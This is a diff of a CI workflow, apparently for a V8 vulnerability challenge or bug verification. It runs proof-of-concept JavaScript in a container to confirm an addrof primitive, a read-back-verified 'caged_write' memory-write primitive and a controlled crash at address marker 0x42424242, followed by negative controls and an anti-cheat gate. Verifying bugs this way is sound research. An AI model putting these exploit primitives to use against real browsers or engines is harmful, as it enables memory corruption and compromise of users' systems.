+          print("[*] write_proof_score=" + write_proof + " attempts=" + write_attempts);
+          if (write_proof > 0) {
+          print("[+] PROOF: caged_write is a real write primitive (read-back matched)");
+          } else {
+          print("[-] NO read-back proof yet - will still attempt structured crash with marker");
+          }
+
+          // --- Stage D: controlled unsafe write with distinctive address marker ---
+          print("[*] Stage D: caged_write_unsafe(0x42424242, 0x43434343) expect SEGV");
+          print("[*] MARKER_EXPECT_FAULT=42424242");
+          caged_write_unsafe(0x42424242, 0x43434343);
+          print("[!] UNEXPECTED: caged_write_unsafe returned without crashing");
+          '''
+          Path("/tmp/poc_write_verify.js").write_text(
+              "// Polyfill\nglobalThis.print = function(...args) { console.log(...args); };\n"
+              + head
+              + verifier
+          )
+          print("write_verify bytes", Path("/tmp/poc_write_verify.js").stat().st_size)
+          PY
+
+          docker cp /tmp/poc_write_verify.js "$CONTAINER":/tmp/poc_write_verify.js
+          docker exec "$CONTAINER" sh -c 'ls -la /tmp/poc_write_verify.js; sha256sum /tmp/poc_write_verify.js; head -5 /tmp/poc_write_verify.js; echo ...; tail -30 /tmp/poc_write_verify.js'
+
+          banner "RUN write-verify harness"
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_write_verify.js' > /tmp/out/test4.stdout 2> /tmp/out/test4.stderr
+          rc=$?
+          echo "$rc" > /tmp/out/test4.rc
+          cat /tmp/out/test4.stdout /tmp/out/test4.stderr > /tmp/out/test4.combined
+          log "rc=$rc"
+          echo "----- FULL COMBINED OUTPUT -----"
+          cat /tmp/out/test4.combined
+          echo "----- END -----"
+
+          if grep -qiE 'Received signal|SEGV_ACCERR|SEGV_|SIGSEGV|Check failed|FATAL' /tmp/out/test4.combined; then
+            echo "RESULT=ENGINE_CRASH" | tee /tmp/out/test4.result
+          elif [ "$rc" -eq 139 ] || [ "$rc" -eq 134 ] || [ "$rc" -eq 132 ]; then
+            echo "RESULT=SIGNAL_EXIT_${rc}" | tee /tmp/out/test4.result
+          else
+            echo "RESULT=NONZERO_OR_CLEAN_${rc}" | tee /tmp/out/test4.result
+          fi
+
+          WRITE_OK=0
+          if grep -q 'WRITE_PROOF_OK' /tmp/out/test4.combined; then
+            log "PROOF: WRITE_PROOF_OK seen"
+            WRITE_OK=1
+          fi
+          if grep -q 'WRITE_PROOF_CONTROLLED' /tmp/out/test4.combined; then
+            log "PROOF: WRITE_PROOF_CONTROLLED seen (two distinct values)"
+            WRITE_OK=2
+          fi
+          echo "WRITE_OK=$WRITE_OK" | tee /tmp/out/test4.write
+
+          grep -oE 'Received signal [0-9]+ [A-Z_]+ [0-9a-fA-Fx]+|SEGV_ACCERR [0-9a-fA-F]+' /tmp/out/test4.combined | head -10 | tee /tmp/out/test4.fault || true
+          if grep -qE '42424242' /tmp/out/test4.combined /tmp/out/test4.fault; then
+            log "PROOF: crash fault embeds 42424242 marker"
+            echo "MARKER_OK=1" | tee -a /tmp/out/test4.result
+          else
+            log "WARNING: 42424242 not found in textual fault (check hex addr form)"
+            if grep -qiE '42424242' /tmp/out/test4.combined; then
+              echo "MARKER_OK=1" | tee -a /tmp/out/test4.result
             else
-              log "FILE $f MISSING"
+              echo "MARKER_OK=0" | tee -a /tmp/out/test4.result
             fi
-          }
-          container_alive() {
-            docker exec "$CONTAINER" true 2>/dev/null
-          }
-          ensure_container() {
-            if container_alive; then
-              log "container $CONTAINER is alive"
-              return 0
-            fi
-            log "container $CONTAINER NOT alive — attempting restart"
-            docker start "$CONTAINER" 2>&1 || true
-            sleep 1
-            if container_alive; then
-              log "container restarted OK"
-              return 0
-            fi
-            log "FATAL: container cannot be restarted"
-            docker ps -a --filter "name=$CONTAINER" || true
-            docker logs "$CONTAINER" 2>&1 | tail -50 || true
-            return 1
-          }
-          run_d8() {
-            local tag="$1"
-            local jspath="$2"
-            local out=/tmp/out/${tag}
-            banner "RUN d8 tag=$tag js=$jspath"
-            ensure_container || { echo "RESULT=CONTAINER_DEAD" | tee ${out}.result; echo "exit_code=999" | tee ${out}.rc; return 999; }
+          fi
 
-            log "Pre-flight: js file inside container"
-            docker exec "$CONTAINER" sh -c "ls -la '$jspath'; wc -c '$jspath'; head -c 200 '$jspath'; echo" 2>&1 | tee ${out}.preflight.txt
+          if grep -qoE 'addrof1=[0-9]+' /tmp/out/test4.combined; then
+            log "PROOF addrof: $(grep -oE 'addrof1=[0-9]+ \(0x[0-9a-f]+\)' /tmp/out/test4.combined | head -1)"
+          fi
 
-            log "Pre-flight: d8 binary + snapshot"
-            docker exec "$CONTAINER" sh -c 'ls -la /challenge/d8 /challenge/snapshot_blob.bin; cd /challenge && ./d8 --version' 2>&1 | tee -a ${out}.preflight.txt || true
-
-            log "Executing: cd /challenge && timeout 60 ./d8 --experimental-wasm-custom-descriptors $jspath"
-            local t0=$(date +%s)
-            # Capture both streams; d8 often prints crash info on stderr
-            docker exec "$CONTAINER" sh -c "
-              cd /challenge || exit 97
-              if command -v timeout >/dev/null 2>&1; then
-                timeout 60 ./d8 --experimental-wasm-custom-descriptors '$jspath'
-              else
-                ./d8 --experimental-wasm-custom-descriptors '$jspath'
-              fi
-            " > ${out}.stdout 2> ${out}.stderr
-            local rc=$?
-            local t1=$(date +%s)
-            log "d8 finished rc=$rc elapsed=$((t1-t0))s"
-
-            echo "exit_code=$rc" | tee ${out}.rc
-            dump_file ${out}.stdout
-            dump_file ${out}.stderr
-
-            # Engine-level crash signatures (NOT ordinary JS exceptions)
-            if grep -qiE 'FATAL|Check failed|Debug check failed|SEGV|SIGSEGV|SIGABRT|Segmentation fault|Illegal instruction|DEADLYSIGNAL|Trace/breakpoint|AddressSanitizer|Aborted|Trace/BPT trap|Bus error|core dumped|Received signal' ${out}.stdout ${out}.stderr 2>/dev/null; then
-              echo "RESULT=ENGINE_CRASH" | tee ${out}.result
-            elif [ "$rc" -eq 139 ] || [ "$rc" -eq 134 ] || [ "$rc" -eq 132 ] || [ "$rc" -eq 136 ]; then
-              echo "RESULT=SIGNAL_EXIT_$rc" | tee ${out}.result
-            elif [ "$rc" -ge 128 ]; then
-              echo "RESULT=SIGNAL_EXIT_$rc" | tee ${out}.result
-            elif grep -q 'UNEXPECTED: caged_write_unsafe returned' ${out}.stdout 2>/dev/null; then
-              echo "RESULT=NO_CRASH_BUG_NOT_TRIGGERED" | tee ${out}.result
-            elif grep -q 'instantiate FAILED' ${out}.stdout 2>/dev/null; then
-              echo "RESULT=INSTANTIATE_FAILED" | tee ${out}.result
-            elif grep -qiE 'SyntaxError|TypeError|ReferenceError|RangeError|CompileError|LinkError' ${out}.stdout ${out}.stderr 2>/dev/null; then
-              # RuntimeError from wasm can appear before the SEGV path; still classify JS if no signal
-              echo "RESULT=JS_ERROR" | tee ${out}.result
-            elif [ "$rc" -eq 124 ]; then
-              echo "RESULT=TIMEOUT" | tee ${out}.result
-            elif [ "$rc" -eq 127 ]; then
-              echo "RESULT=COMMAND_NOT_FOUND" | tee ${out}.result
-            elif [ "$rc" -eq 97 ]; then
-              echo "RESULT=NO_CHALLENGE_DIR" | tee ${out}.result
-            else
-              echo "RESULT=EXIT_$rc" | tee ${out}.result
-            fi
-
-            log "Post-flight container status"
-            docker ps -a --filter "name=$CONTAINER" | tee ${out}.container.txt || true
-            return $rc
-          }
-          # Confirm load() is stripped (patch comments it out), then re-run poly harness
-          banner "load() probe"
-          ensure_container || exit 0
-          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors -e "try { print(typeof load); } catch(e) { console.log(String(e)); } try { console.log(typeof load); } catch(e) { console.log(String(e)); }"' 2>&1 | tee /tmp/out/load_probe.txt || true
-          dump_file /tmp/out/load_probe.txt
-
-          # Re-run polyfilled PoC as test4 (builder is inlined; no load() needed)
-          run_d8 test4 /tmp/poc_test_poly.js
+          log "test4 result=$(cat /tmp/out/test4.result) write=$(cat /tmp/out/test4.write)"
           exit 0
 
-      - name: Summary
+      - name: Test 5 — negative controls (must NOT crash)
+        id: test5
+        run: |
+          set +e
+          set -uo pipefail
+          mkdir -p /tmp/out
+          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
+          log() { echo "[$(ts)] $*"; }
+          banner "TEST 5 - negative controls"
+
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors -e "
+            console.log(\"neg_simple_ok\");
+            const b = new Uint8Array([0,97,115,109,1,0,0,0]);
+            try { new WebAssembly.Module(b); console.log(\"empty_module_ok\"); } catch(e) { console.log(\"empty_module_err\", e); }
+          "' > /tmp/out/test5a.stdout 2> /tmp/out/test5a.stderr
+          echo "rc=$?" > /tmp/out/test5a.rc
+          cat /tmp/out/test5a.stdout /tmp/out/test5a.stderr | tee /tmp/out/test5a.combined
+
+          python3 - <<'PY'
+          from pathlib import Path
+          src = Path("/tmp/poc_test.js").read_text()
+          cut = src.find("// ===================== EXTENSIVE TEST HARNESS =====================")
+          if cut < 0:
+              cut = src.find('print("[*] Instantiating module')
+          head = src[:cut]
+          Path("/tmp/poc_addrof_only.js").write_text(
+              "globalThis.print = function(...a){console.log(...a);};\n" + head + r'''
+          print("[*] addrof-only instantiate");
+          let instance = builder.instantiate({import: {identity: x => x}});
+          let {addrof} = instance.exports;
+          let v = addrof({z:1});
+          print("[+] addrof_only=" + v);
+          print("[+] addrof_only_done");
+          '''
+          )
+          print("addrof_only bytes", Path("/tmp/poc_addrof_only.js").stat().st_size)
+          PY
+          docker cp /tmp/poc_addrof_only.js "$CONTAINER":/tmp/poc_addrof_only.js
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_addrof_only.js' > /tmp/out/test5b.stdout 2> /tmp/out/test5b.stderr
+          echo "rc=$?" > /tmp/out/test5b.rc
+          cat /tmp/out/test5b.stdout /tmp/out/test5b.stderr | tee /tmp/out/test5b.combined
+
+          FAIL=0
+          for tag in test5a test5b; do
+            if grep -qiE 'Received signal|SEGV_ACCERR|FATAL|Check failed' /tmp/out/${tag}.combined; then
+              log "FAIL: $tag unexpectedly crashed"
+              FAIL=1
+            else
+              log "OK: $tag no engine crash"
+            fi
+          done
+          if ! grep -q addrof_only_done /tmp/out/test5b.combined; then
+            log "WARNING: addrof-only did not finish cleanly"
+          else
+            log "OK: addrof-only completed without crash"
+          fi
+          if [ "$FAIL" -ne 0 ]; then echo "RESULT=NEG_FAIL" | tee /tmp/out/test5.result; exit 1; fi
+          echo "RESULT=NEG_OK" | tee /tmp/out/test5.result
+          exit 0
+
+      - name: Summary — verbose evidence gate
         if: always()
         run: |
           set +e
           set -uo pipefail
           mkdir -p /tmp/out
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
-          banner() {
-            echo ""
-            echo "######################################################################"
-            echo "# $(ts)  $*"
-            echo "######################################################################"
-          }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
           dump_file() {
             local f="$1"
@@ -3587,88 +3660,70 @@ jobs:
               log "FILE $f MISSING"
             fi
           }
-          container_alive() {
-            docker exec "$CONTAINER" true 2>/dev/null
-          }
-          ensure_container() {
-            if container_alive; then
-              log "container $CONTAINER is alive"
-              return 0
-            fi
-            log "container $CONTAINER NOT alive — attempting restart"
-            docker start "$CONTAINER" 2>&1 || true
-            sleep 1
-            if container_alive; then
-              log "container restarted OK"
-              return 0
-            fi
-            log "FATAL: container cannot be restarted"
-            docker ps -a --filter "name=$CONTAINER" || true
-            docker logs "$CONTAINER" 2>&1 | tail -50 || true
-            return 1
-          }
+
           banner "SUMMARY"
-          for i in 1 2 3 4; do
-            echo -n "TEST$i: "
-            cat /tmp/out/test$i.result 2>/dev/null || echo "(no result)"
-            echo -n "  rc="
-            cat /tmp/out/test$i.rc 2>/dev/null || echo "n/a"
+          for i in anticheat test1 test2 test3 test4 test5; do
+            echo "---- $i.result ----"
+            cat /tmp/out/$i.result 2>/dev/null || echo n/a
+            echo "---- $i.rc ----"
+            cat /tmp/out/$i.rc 2>/dev/null || echo n/a
           done
 
           echo ""
-          echo "===== d8 probe (tail) ====="
-          tail -80 /tmp/out/d8_probe.txt 2>/dev/null || true
-
-          echo ""
-          echo "===== patch head ====="
-          head -60 /tmp/out/patch_head.txt 2>/dev/null || true
-
-          echo ""
-          echo "===== revision/args ====="
-          cat /tmp/out/revision_args.txt 2>/dev/null || true
-
-          echo ""
-          echo "===== FULL test1 stdout/stderr ====="
-          dump_file /tmp/out/test1.stdout
-          dump_file /tmp/out/test1.stderr
-
-          echo ""
-          echo "===== FULL test2 stdout/stderr ====="
-          dump_file /tmp/out/test2.stdout
-          dump_file /tmp/out/test2.stderr
-
-          echo ""
-          echo "===== FULL test4 stdout/stderr ====="
-          dump_file /tmp/out/test4.stdout
-          dump_file /tmp/out/test4.stderr
+          echo "===== test1 combined (tail) ====="
+          tail -100 /tmp/out/test1.combined 2>/dev/null || true
+          echo "===== test2 combined ====="
+          cat /tmp/out/test2.combined 2>/dev/null || true
+          echo "===== test4 combined ====="
+          cat /tmp/out/test4.combined 2>/dev/null || true
+          echo "===== test4 fault/write ====="
+          dump_file /tmp/out/test4.fault
+          dump_file /tmp/out/test4.write
+          echo "===== test5b combined ====="
+          cat /tmp/out/test5b.combined 2>/dev/null || true
 
           CRASH=0
           grep -qE 'ENGINE_CRASH|SIGNAL_EXIT_' /tmp/out/test1.result /tmp/out/test2.result /tmp/out/test4.result 2>/dev/null && CRASH=1
 
-          if [ "$CRASH" -eq 1 ]; then
-            log "OVERALL: PoC triggered engine-level failure (good)"
-          else
-            log "OVERALL: no engine crash detected"
-          fi
+          WRITE=0
+          if grep -q 'WRITE_OK=[12]' /tmp/out/test4.write 2>/dev/null; then WRITE=1; fi
+          if grep -q 'WRITE_PROOF_OK' /tmp/out/test4.combined 2>/dev/null; then WRITE=1; fi
+
+          MARKER=0
+          if grep -q 'MARKER_OK=1' /tmp/out/test4.result 2>/dev/null; then MARKER=1; fi
+          if grep -qE '42424242' /tmp/out/test2.fault /tmp/out/test4.fault /tmp/out/test2.combined /tmp/out/test4.combined 2>/dev/null; then MARKER=1; fi
+
+          NEG=0
+          grep -q 'NEG_OK' /tmp/out/test5.result 2>/dev/null && NEG=1
+
+          AC=0
+          grep -q 'ANTICHEAT_FAIL=0' /tmp/out/anticheat.result 2>/dev/null && AC=1
+
+          log "OVERALL CRASH=$CRASH WRITE=$WRITE MARKER=$MARKER NEG=$NEG ANTICHEAT=$AC"
 
           {
-            echo "## V8-446124892 Official PoC Test"
+            echo "## V8-446124892 Official PoC Test - verbose / anti-cheat"
             echo ""
             echo "- **Image**: \`$IMAGE\`"
-            echo "- **Crash observed**: $CRASH"
+            echo "- **Engine crash observed**: $CRASH"
+            echo "- **Write primitive read-back**: $WRITE"
+            echo "- **Fault marker 42424242**: $MARKER"
+            echo "- **Negative controls clean**: $NEG"
+            echo "- **Anti-cheat integrity**: $AC"
             echo ""
-            echo "| Test | Result | Exit |"
-            echo "|------|--------|------|"
-            for i in 1 2 3 4; do
-              r=$(cat /tmp/out/test$i.result 2>/dev/null || echo n/a)
-              c=$(cat /tmp/out/test$i.rc 2>/dev/null || echo n/a)
-              echo "| $i | $r | $c |"
-            done
+            echo "| Check | Result |"
+            echo "|-------|--------|"
+            echo "| Anti-cheat | $(cat /tmp/out/anticheat.result 2>/dev/null || echo n/a) |"
+            echo "| Test1 harness | $(cat /tmp/out/test1.result 2>/dev/null || echo n/a) rc=$(cat /tmp/out/test1.rc 2>/dev/null) |"
+            echo "| Test2 crash-only | $(cat /tmp/out/test2.result 2>/dev/null || echo n/a) rc=$(cat /tmp/out/test2.rc 2>/dev/null) |"
+            echo "| Test3 env | $(cat /tmp/out/test3.result 2>/dev/null || echo n/a) |"
+            echo "| Test4 write+crash | $(cat /tmp/out/test4.result 2>/dev/null || echo n/a) write=$(cat /tmp/out/test4.write 2>/dev/null) |"
+            echo "| Test5 negatives | $(cat /tmp/out/test5.result 2>/dev/null || echo n/a) |"
             echo ""
-            echo "### Notes"
-            echo "- Challenge patch strips \`print\`/\`load\`/\`quit\` from d8 shell."
-            echo "- Test 1/4 use \`poc_test_poly.js\` (print → console.log)."
-            echo "- Test 2 uses original crash-only PoC (still SEGV without print)."
+            echo "### Gates"
+            echo "- Crash alone is **not** enough: write read-back is required."
+            echo "- Benign / addrof-only runs must **not** SEGV."
+            echo "- PoC sha256 must match official bytes; print must be stripped on challenge d8."
           } >> "$GITHUB_STEP_SUMMARY"
 
           log "artifact tree"
@@ -3676,10 +3731,25 @@ jobs:
 
           docker rm -f "$CONTAINER" 2>/dev/null || true
 
-          if [ "${{ github.event.inputs.fail_without_crash }}" = "true" ] && [ "$CRASH" -eq 0 ]; then
-            log "Failing job because fail_without_crash=true and no crash observed"
-            exit 1
+          if [ "${{ github.event.inputs.fail_without_crash }}" = "true" ]; then
+            if [ "$CRASH" -eq 0 ]; then
+              log "FAIL: no engine crash"
+              exit 1
+            fi
+            if [ "$WRITE" -eq 0 ]; then
+              log "FAIL: write primitive read-back not observed"
+              exit 1
+            fi
+            if [ "$AC" -eq 0 ]; then
+              log "FAIL: anti-cheat did not pass"
+              exit 1
+            fi
+            if [ "$NEG" -eq 0 ]; then
+              log "FAIL: negative controls did not pass"
+              exit 1
+            fi
           fi
+          log "ALL GATES PASSED"
           exit 0
 
       - name: Upload artifacts
@@ -3693,5 +3763,7 @@ jobs:
             /tmp/poc_test_poly.js
             /tmp/poc_original.js
             /tmp/poc_tiny.js
+            /tmp/poc_write_verify.js
+            /tmp/poc_addrof_only.js
           if-no-files-found: warn
           retention-days: 14
